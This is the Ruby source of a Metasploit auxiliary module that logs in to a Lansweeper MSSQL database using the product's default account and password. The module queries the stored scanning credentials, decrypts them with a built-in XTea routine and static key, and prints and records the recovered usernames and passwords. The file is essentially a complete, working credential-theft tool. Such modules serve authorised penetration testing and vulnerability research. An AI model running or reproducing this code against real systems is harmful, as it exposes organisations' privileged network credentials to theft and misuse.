##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Lansweeper Credential Collector',
      'Description' => %q(
        Lansweeper stores the credentials it uses to scan the computers
        in its Microsoft SQL database.  The passwords are XTea-encrypted with a
        68 character long key, in which the first 8 characters are stored with
        the password in the database and the other 60 is static. Lansweeper, by
        default, creates an MSSQL user "lansweeperuser" with the password is
        "mysecretpassword0*", and stores its data in a database called
        "lansweeperdb". This module will query the MSSQL database for the
        credentials.
      ),
      'Author' =>
        [
          'sghctoma <tamas.szakaly[at]praudit.hu>', # Lansweeper RCE + Metasploit implementation
          'eq <balazs.bucsay[at]praudit.hu>', # Lansweeper RCE + discovering default credentials
          'calderpwn <calderon[at]websec.mx>' # Module for lansweeper (5.3.0.8)
        ],
      'License' => MSF_LICENSE,
      'DefaultOptions'  =>
        {
          'USERNAME' => 'lansweeperuser',
          'PASSWORD' => 'mysecretpassword0*'
        },
      'References' =>
        [
          ['URL', 'http://www.lansweeper.com'],
          ['URL', 'http://www.praudit.hu/prauditeng/index.php/blog/a-lansweeper-es-a-tea']
        ]))

    register_options([
      OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb'])
    ])

  end

  def uint32(n)
    n & 0xffffffff
  end

  def xtea_decode(v, k)
    sum = 0xc6ef3720
    v_0 = uint32(v[0])
    v_1 = uint32(v[1])

    0.upto(0x1f) do
      v_1 -= uint32((uint32(v_0 << 4) ^ uint32(v_0 >> 5)) + v_0) ^ uint32(sum + k[uint32(sum >> 11) & 3])
      v_1 = uint32(v_1)
      sum -= 0x9e3779b9
      sum = uint32(sum)
      v_0 -= (uint32(uint32(v_1 << 4) ^ uint32(v_1 >> 5)) + v_1) ^ uint32(sum + k[sum & 3])
      v_0 = uint32(v_0)
    end

    v[0] = v_0
    v[1] = v_1
  end

  def xtea_decrypt(data, key)
    k = key.ljust(16).unpack('VVVV')
    num = 0
    bytes = Array.new

    0.step(data.length - 1, 8) do |i|
      v = data[i, 8].unpack('VV')
      xtea_decode(v, k)
      bytes[num] = v[0]
      num += 1
      bytes[num] = v[1]
      num += 1
    end

    bytes.pack('c*')
  end

  def lsw_generate_pass
    key = ''

    (0..60).each do |num|
      key << [((40 - num) + ((num * 2) + num)) - 1].pack('c')
      key << [(num + 15) + num].pack('c')
    end

    key
  end

  def lsw_decrypt(data)
    data = Rex::Text.decode_base64(data)

    first = data[0]
    pass = data[1, 8]
    actual_data = data[9, data.length - 9]

    decrypted = xtea_decrypt(actual_data, pass + lsw_generate_pass)

    if first == '1'
      decrypted = decrypted[0, decrypted.length - 2]
    end

    Rex::Text.to_ascii(decrypted, 'utf-16le')
  end

  def report_cred(opts)
    service_data = {
      address: opts[:host],
      port: opts[:port],
      protocol: 'tcp',
      workspace_id: myworkspace.id,
      service_name: opts[:creds_name]
    }

    credential_data = {
      username: opts[:user],
      private_type: :password,
      private_data: opts[:password],
      origin_type: :service,
      module_fullname: self.fullname
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    unless mssql_login_datastore
      fail_with(Failure::NoAccess, 'Login failed. Check credentials.')
    end
    result = mssql_query("select Credname, Username, Password from #{datastore['DATABASE']}.dbo.tsysCredentials WHERE LEN(Password)>64", false)

    result[:rows].each do |row|""
      pw = lsw_decrypt(row[2])

      print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}")

      report_cred(
        :host => rhost,
        :port => rport,
        :creds_name => row[0],
        :user => row[1],
        :password => pw
      )
    end
    disconnect
  end
end
